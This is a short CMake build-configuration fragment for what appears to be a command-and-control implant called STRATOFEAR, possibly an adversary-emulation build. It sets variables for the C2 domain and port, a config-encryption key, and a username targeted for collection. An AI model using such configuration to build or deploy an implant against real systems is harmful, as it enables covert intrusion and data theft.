set(C2_DOMAIN $ENV{C2_DOMAIN} CACHE STRING "IP Address or Domain used to connect to the C2 Server. String Value")
set(C2_PORT $ENV{C2_PORT} CACHE STRING "Port used to connect to the C2 Server. Appended to the domain using `:`.")
set(CONFIG_ENC_KEY $ENV{CONFIG_ENC_KEY} CACHE STRING "String used for ecrypting/decrypting the configuration file for STRATOFEAR. AES128")
set(CONFIG_PATH_ENV $ENV{CONFIG_PATH_ENV} CACHE STRING "Network configuration filepath for STRATOFEAR")
set(CONFIG_FILENAME_ENV $ENV{CONFIG_FILENAME_ENV} CACHE STRING "Network configuration filename for STRATOFEAR")
set(MODULE_USERNAME $ENV{MODULE_USERNAME} CACHE STRING "Username for targeted collection in modules")
set(CERT_PATH_ENV $ENV{CERT_PATH_ENV} CACHE STRING "SSL cert filepath for STRATOFEAR HTTPS")
set(HEADER_PATH_ENV $ENV{HEADER_PATH_ENV} CACHE STRING "Header containing embedded HTTPS cert filepath")